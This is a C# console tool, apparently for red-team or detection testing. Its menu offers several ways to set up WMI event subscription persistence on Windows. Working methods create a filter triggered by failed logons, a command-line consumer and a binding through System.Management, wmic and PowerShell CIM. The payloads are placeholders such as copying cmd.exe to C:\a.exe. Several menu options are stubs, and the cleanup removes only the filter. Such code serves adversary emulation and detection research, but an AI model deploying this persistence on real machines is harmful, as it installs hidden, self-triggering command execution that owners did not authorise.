using System;
using System.Management;
using System.Diagnostics;
using System.Management.Automation;

namespace WMIner
{
    class Program
    {
        public static void Main()
        {
            var MainMenu = new EasyConsole.Menu()
                .Add("Persistence using C#", () => SharpWMIPersist())
                .Add("Persistence using WMIC", () => InvokeWMIC())
                .Add("Persistence using Powershell CIM cmdlets", () => PoshCIM())
                .Add("Persistence using Powershell WMI cmdlets", () => PoshWMI())
                .Add("Persistence using mofcomp.exe", () => MofComp())
                .Add("Persistence using Empire's persistence/elevated/wmi", () => InvokeEmpire())
                .Add("Get Rid of the components", () => Cleaner());

            MainMenu.Display();
        }
        public static void SharpWMIPersist()
        {
            ManagementObject EventFilter = null;
            ManagementObject EventConsumer = null;
            ManagementObject Binding = null;
            ManagementScope scope = new ManagementScope("\\\\.\\root\\subscription");

            //EventFilter Creation
            ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
            WqlEventQuery wqlFilterQuery = new WqlEventQuery("SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625'");
            EventFilter = wmiEventFilter.CreateInstance();
            EventFilter["Name"] = "WMITestFilter";
            EventFilter["Query"] = wqlFilterQuery.QueryString;
            EventFilter["QueryLanguage"] = wqlFilterQuery.QueryLanguage;
            EventFilter["EventNameSpace"] = @"\root\cimv2";
            EventFilter.Put();
            Console.WriteLine("Filter created");

            //EventConsumer Creation
            ManagementClass wmiEventConsumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null);
            EventConsumer = wmiEventConsumer.CreateInstance();
            EventConsumer["Name"] = "WMITestConsumer";
            EventConsumer["CommandLineTemplate"] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe copy C:\\Windows\\System32\\cmd.exe C:\\a.exe";
            EventConsumer.Put();
            Console.WriteLine("Consumer created");

            //Binding Creation
            ManagementClass wmiBinding = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null);
            Binding = wmiBinding.CreateInstance();
            Binding["Filter"] = EventFilter.Path.RelativePath;
            Binding["Consumer"] = EventConsumer.Path.RelativePath;
            Binding.Put();
            Console.WriteLine(EventFilter.Path.RelativePath);
            Console.WriteLine(EventConsumer.Path.RelativePath);
            Console.WriteLine(Binding.Path.RelativePath);
            Console.WriteLine("Binding created, Now persistent");
        }
        public static void InvokeEmpire()
        {
            Console.WriteLine("Just working");
        }
        public static void InvokeWMIC()
        {
            //EventFilter Creation
            Process wmicproc = new Process();
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.FileName = @"cmd.exe";
            Info.Arguments = @"/C wmic /NAMESPACE:""\\root\subscription"" PATH  __EventFilter CREATE Name=""WMITestFilter"", EventNameSpace =""root\cimv2"",QueryLanguage =""WQL"", Query =""SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625'""";
            Info.CreateNoWindow = true;
            wmicproc.StartInfo = Info;
            wmicproc.Start();
            DateTime ExecTime = DateTime.Now;
            Console.WriteLine("Filter Created at " + ExecTime);

            //EventConsumer Creation
            wmicproc = new Process();
            Info = new ProcessStartInfo();
            Info.FileName = @"cmd.exe";
            Info.Arguments = @"/C wmic /NAMESPACE:""\\root\subscription"" PATH CommandLineEventConsumer CREATE Name=""WMITestConsumer"", CommandLineTemplate=""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe echo 'a' > C:\a.txt""";
            Info.CreateNoWindow = true;
            wmicproc.StartInfo = Info;
            wmicproc.Start();
            ExecTime = DateTime.Now;
            Console.WriteLine("Consumer Created at " + ExecTime);

            //Binding Creation
            wmicproc = new Process();
            Info = new ProcessStartInfo();
            Info.FileName = @"cmd.exe";
            Info.Arguments = @"/C wmic /NAMESPACE:""\\root\subscription"" PATH __FilterToConsumerBinding CREATE Filter=""__EventFilter.Name=\""WMITestFilter\"""", Consumer=""CommandLineEventConsumer.Name=\""WMITestConsumer\""""";
            Info.CreateNoWindow = true;
            wmicproc.StartInfo = Info;
            wmicproc.Start();
            ExecTime = DateTime.Now;
            Console.WriteLine("Binding Created at " + ExecTime);
        }
        public static void PoshCIM()
        {
            PowerShell ps = PowerShell.Create();
            string createPersist = @"
                $FilterArgs = @{name='WMITestFilter';EventNameSpace='root\CimV2';QueryLanguage=""WQL"";Query=""SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625'""};
                $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
                $ConsumerArgs = @{name='WMITestConsumer';CommandLineTemplate=""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe copy C:\Windows\System32\cmd.exe C:\a.exe"";}
                $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
                $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter = [Ref] $Filter;Consumer = [Ref] $Consumer;}";
            ps.AddScript(createPersist).Invoke();
            Console.WriteLine("Debug");
        }
        public static void PoshWMI()
        {
            Console.WriteLine("Just working");
        }
        public static void MofComp()
        {
            Console.WriteLine("Just working");
            DateTime ExecTime = DateTime.Now;
            Console.WriteLine(ExecTime);
        }
        public static void Cleaner()
        {
            ManagementObject defaultFilter = new ManagementObject(@"\\root\subscription:__EventFilter.Name=""WMITestFilter""");
            defaultFilter.Delete();
        }
    }
}
